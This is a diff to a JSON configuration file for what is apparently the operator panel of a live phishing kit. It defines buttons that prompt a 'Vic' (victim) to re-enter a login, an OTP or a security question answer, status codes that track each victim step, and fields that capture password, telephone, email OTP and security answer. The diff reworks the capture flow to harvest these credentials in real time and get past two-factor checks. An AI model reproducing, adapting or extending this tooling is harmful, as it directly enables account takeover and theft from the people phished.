@@ -1737,53 +1737,57 @@
     "buttons": [
       {
         "name": "ASK LOGIN AGAIN",
-        "status": "7"
+        "status": "8"
       },
       {
-        "name": "ASK SMS OTP",
-        "status": "2"
+        "name": "ASK OTP",
+        "status": "3"
       },
       {
-        "name": "ASK EMAIL OTP",
-        "status": "4"
+        "name": "ASK SEC QUESTION",
+        "status": "5",
+        "input": {
+          "id": "question",
+          "placeholder": "Security Question"
+        }
       },
       {
         "name": "FINISH",
-        "status": "6"
+        "status": "7"
       }
     ],
     "status": [
       {
         "status": 0,
-        "meaning": "Vic Resubmitted Login"
+        "meaning": "Vic Waiting... Resubmitted Login"
       },
       {
         "status": 1,
-        "meaning": "Vic Waiting... Submitted Login"
+        "meaning": "Vic Submitted Login... Submitting Telephone"
       },
       {
         "status": 2,
-        "meaning": "Vic Submitting SMS OTP"
+        "meaning": "Vic Waiting... Submitted Telephone"
       },
       {
         "status": 3,
-        "meaning": "Vic Waiting... Submitted SMS OTP"
+        "meaning": "Vic Submitting OTP"
       },
       {
         "status": 4,
-        "meaning": "Vic Submitting Email OTP"
+        "meaning": "Vic Waiting... Submitted OTP"
       },
       {
         "status": 5,
-        "meaning": "Vic Waiting... Submitted Email OTP"
+        "meaning": "Vic Submitting Sec Answer"
       },
       {
         "status": 6,
-        "meaning": "Finished"
+        "meaning": "Vic Waiting... Submitted Sec Answer"
       },
       {
         "status": 7,
-        "meaning": "Vic Resubmitting Login"
+        "meaning": "Finished"
       }
     ],
     "information": [
@@ -1796,12 +1800,16 @@
         "key": "password"
       },
       {
-        "heading": "SMS OTP",
-        "key": "smsCode"
+        "heading": "Telephone",
+        "key": "telephone"
       },
       {
         "heading": "Email OTP",
         "key": "emailCode"
+      },
+      {
+        "heading": "Security Answer",
+        "key": "answer"
       }
     ],
     "mainInfo": [
